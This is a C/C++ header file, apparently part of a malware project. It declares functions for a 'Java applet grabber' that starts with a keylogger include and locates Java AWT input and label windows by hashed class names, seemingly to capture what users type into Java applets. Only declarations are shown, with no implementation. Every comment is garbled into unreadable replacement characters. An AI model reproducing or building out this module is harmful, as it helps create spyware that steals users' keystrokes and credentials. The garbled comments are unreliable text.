//---------------------------------------------------------------------------
//
//  ������ ������������� �������� � ��� �������
//
//  �������������: ������� 2012
//  ������:        1.0
//
//
//  �����:  ��� ���������� ������������� ������� ����������
//          �������� ������ ������ �� ���� ������������
//          ������ ��������
//
//---------------------------------------------------------------------------

#ifndef JavaAppletGrabbersH
#define JavaAppletGrabbersH
//---------------------------------------------------------------------------

#include <Windows.h>
#include "UniversalKeyLogger.h"


// ���� ������� ���� ���
#define JAVAWND_SUNAWTFRAME  0x809BB5B9 /* sunawtframe */
#define JAVAWND_SUNAWTDIALOG 0xFDDA99B6 /* sunawtdialog */

//-----------------------------------------------
//  ������� �������������� ������� �������� �
//  ��� �������
//-----------------------------------------------
bool InitializeJavaAppletGrabbers();




//=========================================================
//  ������� ��� ������ � �������� ���
//=========================================================


//-----------------------------------------------
// IsJavaEditWindow - ������� ���������� ������
//                    ���� ���� ��������
//                    ���������� ����� ��� ������
//-----------------------------------------------
bool IsJavaEditWindow(HWND Wnd);


//-----------------------------------------------
//  IsJavaLabelWindow - ������� ���������� ������
//                     ���� �������� �������
//                     ��������
//-----------------------------------------------
bool IsJavaLabelWindow(HWND Wnd);



//-----------------------------------------------
//  GetSunAwtCanvasWnd - ������� ���������� ����
//                       SunAwtCanvas
//-----------------------------------------------
HWND GetSunAwtCanvasWnd(HWND SunAwtFrameWnd);


//---------------------------------------------------------------------------
#endif
